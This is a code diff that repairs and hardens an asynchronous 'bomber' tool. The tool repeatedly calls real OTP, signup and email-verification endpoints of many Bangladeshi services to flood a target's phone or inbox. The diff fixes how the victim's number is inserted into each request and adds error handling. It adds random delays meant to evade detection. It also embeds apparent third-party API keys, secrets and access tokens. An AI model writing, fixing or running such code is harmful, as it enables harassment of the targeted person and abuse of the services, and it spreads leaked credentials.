@@ -1655,7 +1655,7 @@ class AsyncBomber:
         target = self.target
         url = f"https://api.redx.com.bd:443/v1/user/signup".replace("{phone}", target)
         try:
-            async with self.session.post(url, json=json.loads('{phone}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
+            async with self.session.post(url, json=json.loads('{"phone":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
                 await self.log_event("API1 - RedX Signup", success, res.status)
                 return success
@@ -1666,7 +1666,7 @@ class AsyncBomber:
 
     async def api_api2___khaasfood_otp(self):
         target = self.target
-        url = f"https://api.khaasfood.com/api/app/one-time-passwords/token?username={phone}".replace("{phone}", target)
+        url = f"https://api.khaasfood.com/api/app/one-time-passwords/token?username={target}".replace("{phone}", target)
         try:
             async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -1692,7 +1692,7 @@ class AsyncBomber:
 
     async def api_api4___bikroy_phone_login(self):
         target = self.target
-        url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}".replace("{phone}", target)
+        url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}".replace("{phone}", target)
         try:
             async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -1783,7 +1783,7 @@ class AsyncBomber:
 
     async def api_api11___mygp_otp(self):
         target = self.target
-        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/".replace("{phone}", target)
+        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{target}/"
         try:
             async with self.session.post(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -1978,7 +1978,7 @@ class AsyncBomber:
 
     async def api_api26___chorcha_auth_check(self):
         target = self.target
-        url = f"https://mujib.chorcha.net/auth/check?phone={phone}".replace("{phone}", target)
+        url = f"https://mujib.chorcha.net/auth/check?phone={target}".replace("{phone}", target)
         try:
             async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -1991,7 +1991,7 @@ class AsyncBomber:
 
     async def api_api27___wafilife_otp(self):
         target = self.target
-        url = f"https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3".replace("{phone}", target)
+        url = f"https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={target}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3"
         try:
             async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -2121,7 +2121,7 @@ class AsyncBomber:
 
     async def api_api37___mygp_cinematic(self):
         target = self.target
-        url = f"https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D".replace("{phone}", target)
+        url = f"https://api.mygp.cinematic.mobi/api/v1/otp/88{target}/SBENT_3GB7D"
         try:
             async with self.session.post(url, json=json.loads('{"accessinfo":{"access_token":"K165S6V6q4C6G7H0y9C4f5W7t5YeC6","referenceCode":"20190827042622"}}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -2134,7 +2134,7 @@ class AsyncBomber:
 
     async def api_api38___bajistar(self):
         target = self.target
-        url = f"https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}".replace("{phone}", target)
+        url = f"https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{target}"
         try:
             async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -2173,7 +2173,7 @@ class AsyncBomber:
 
     async def api_api41___meenabazar(self):
         target = self.target
-        url = f"https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login".replace("{phone}", target)
+        url = f"https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={target}&type=login"
         try:
             async with self.session.post(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -2186,7 +2186,7 @@ class AsyncBomber:
 
     async def api_api42___medeasy(self):
         target = '+88' + self.target
-        url = f"https://api.medeasy.health/api/send-otp/+88{phone}/".replace("{phone}", target)
+        url = f"https://api.medeasy.health/api/send-otp/+88{target}/"
         try:
             async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -2199,7 +2199,7 @@ class AsyncBomber:
 
     async def api_api43___iqra_live(self):
         target = self.target
-        url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}".replace("{phone}", target)
+        url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{target}"
         try:
             async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -2251,7 +2251,7 @@ class AsyncBomber:
 
     async def api_api47___mygp_send_otp(self):
         target = self.target
-        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/".replace("{phone}", target)
+        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{target}/"
         try:
             async with self.session.post(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -2576,7 +2576,7 @@ class AsyncBomber:
 
     async def api_api72___fabrilife_otp(self):
         target = self.target
-        url = f"https://fabrilifess.com/api/wp-json/wc/v2/user/phone-login/{phone}".replace("{phone}", target)
+        url = f"https://fabrilifess.com/api/wp-json/wc/v2/user/phone-login/{target}"
         try:
             async with self.session.post(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -2758,7 +2758,7 @@ class AsyncBomber:
 
     async def api_api86___ecourier_individual_otp(self):
         target = self.target
-        url = f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}".replace("{phone}", target)
+        url = f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}"
         try:
             async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -2914,7 +2914,7 @@ class AsyncBomber:
 
     async def api_api98___eyecon_app_transport(self):
         target = self.target[1:] if self.target.startswith('0') else self.target
-        url = f"https://api.eyecon-app.com/app/cli_auth/gettransport?cv=vc_510_vn_4.0.510_a&cli=88{phone}&reg_id=flycT4-STvehHQq5O2pTcE%3AAPA91bEpVMgtLmd4vxYZn2jSUH7_Stvvp_4Ui19ibI15gcjVJ7G9Vg5fxAW_MWy6bFtw_I67lPVJzJejjACOEBYVW_ww2_RghRxuHqGZxetBbUzt-8uB7HfKx4MM25P7WbZhn0QzGQu6&installer_name=manually+or+unknown+source&n_sims=2&is_sms_sending_available=true&is_whatsapp_installed=true&device_id=473e9a981fddd587&time_zone=Asia%2FDhaka&device_manu=Xiaomi&device_model=Redmi+Note+7+Pro".replace("{phone}", target)
+        url = f"https://api.eyecon-app.com/app/cli_auth/gettransport?cv=vc_510_vn_4.0.510_a&cli=88{target}&reg_id=flycT4-STvehHQq5O2pTcE%3AAPA91bEpVMgtLmd4vxYZn2jSUH7_Stvvp_4Ui19ibI15gcjVJ7G9Vg5fxAW_MWy6bFtw_I67lPVJzJejjACOEBYVW_ww2_RghRxuHqGZxetBbUzt-8uB7HfKx4MM25P7WbZhn0QzGQu6&installer_name=manually+or+unknown+source&n_sims=2&is_sms_sending_available=true&is_whatsapp_installed=true&device_id=473e9a981fddd587&time_zone=Asia%2FDhaka&device_manu=Xiaomi&device_model=Redmi+Note+7+Pro"
         try:
             async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -3565,7 +3565,7 @@ class AsyncBomber:
 
     async def api_email40___smartview_verify_resend(self):
         target = self.target
-        url = f"https://smartview.com.bd/verify-email/resend?email={phone}".replace("{phone}", target)
+        url = f"https://smartview.com.bd/verify-email/resend?email={target}"
         try:
             async with self.session.get(url, headers=self.get_headers(), timeout=10) as res:
                 success = res.status in [200, 201]
@@ -3704,7 +3704,7 @@ class AsyncBomber:
                 break
 
             # Filter out APIs that are currently in cooldown
-            available_apis = [api_func for api_func in apis if api_func.__name__[4:].lower() not in self.api_cooldowns or asyncio.time() > self.api_cooldowns[api_func.__name__[4:].lower()]]
+            available_apis = [api_func for api_func in apis if api_func.__name__[4:].lower() not in self.api_cooldowns or asyncio.get_event_loop().time() > self.api_cooldowns[api_func.__name__[4:].lower()]]
 
             if not available_apis:
                 logging.warning(f"{Y}[!] All APIs are in cooldown. Waiting for {self.backoff_time} seconds.{W}")
@@ -3712,7 +3712,10 @@ class AsyncBomber:
                 continue
 
             api = random.choice(available_apis)
-            await api()
+            try:
+                await api()
+            except Exception as e:
+                logging.error(f"{R}[!] Task Exception: {e}{W}")
 
             # Jitter: Random delay to mimic human behavior
             await asyncio.sleep(random.uniform(2, 5))
@@ -3779,7 +3782,10 @@ async def main():
                 input_task = asyncio.create_task(asyncio.to_thread(input, ""))
                 
                 # Wait for either all bombing tasks to complete (if limit is set) or user input to stop
-                done, pending = await asyncio.wait(bombing_tasks + [input_task], return_when=asyncio.FIRST_COMPLETED)
+                # We want to stop if the user presses Enter (input_task) OR if all bombing tasks finish.
+                # If limit is 0, bombing tasks will only finish if they crash or are cancelled.
+                bombing_group = asyncio.gather(*bombing_tasks, return_exceptions=True)
+                done, pending = await asyncio.wait([bombing_group, input_task], return_when=asyncio.FIRST_COMPLETED)
 
                 # Signal stop
                 bomber.running = False
